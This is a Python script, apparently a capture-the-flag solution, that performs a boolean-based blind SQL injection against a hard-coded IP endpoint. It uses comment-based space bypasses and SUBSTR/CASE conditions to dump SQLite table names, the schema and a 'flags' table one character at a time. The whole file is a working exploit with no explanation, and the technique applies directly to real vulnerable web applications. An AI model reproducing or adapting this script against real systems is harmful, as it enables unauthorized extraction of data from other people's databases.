import requests
import string

uri = 'http://202.162.35.59:10002/api.php?character='

dump_table_query = "SELECT/**/group_concat(tbl_name)/**/FROM/**/sqlite_master/**/WHERE/**/type='table'/**/and/**/tbl_name/**/NOT/**/like/**/'sqlite_%'"

payload = "keqing'/**/and/**/(select/**/CASE/**/WHEN/**/SUBSTR(({}),{},1)='{}'/**/THEN/**/1/**/ELSE/**/0/**/END)/**/--/**/-"

chara = string.ascii_lowercase + string.digits + '}{_,' + string.ascii_uppercase

# dump table
i = 0
dump = ""
for _ in range(16):
    for c in chara:
        p_table = payload.format(dump_table_query, i, c)
        r = requests.get(uri + p_table)
        res = r.json()
        if res['data']['vote_count'] > 0:
            dump += c
            print('Table name:', dump)
            break
    i += 1

dump_column_query = "SELECT/**/group_concat(sql)/**/FROM/**/sqlite_master/**/WHERE/**/type!='meta'/**/AND/**/sql/**/NOT/**/NULL/**/AND/**/name/**/='flags'"

# dump column
i = 0
dump = ""
for _ in range(50):
    for c in chara:
        p_col = payload.format(dump_column_query, i, c)
        r = requests.get(uri + p_col)
        res = r.json()
        if res['data']['vote_count'] > 0:
            dump += c
            print('Column name:', dump)
            break
    i += 1

dump_flag_query = "SELECT/**/group_concat(value)/**/FROM/**/flags"

# dump flag
i = 0
dump = ""
for _ in range(100):
    for c in chara:
        p_col = payload.format(dump_flag_query, i, c)
        r = requests.get(uri + p_col)
        res = r.json()
        if res['data']['vote_count'] > 0:
            dump += c
            print('FLAG:', dump)
            break
    i += 1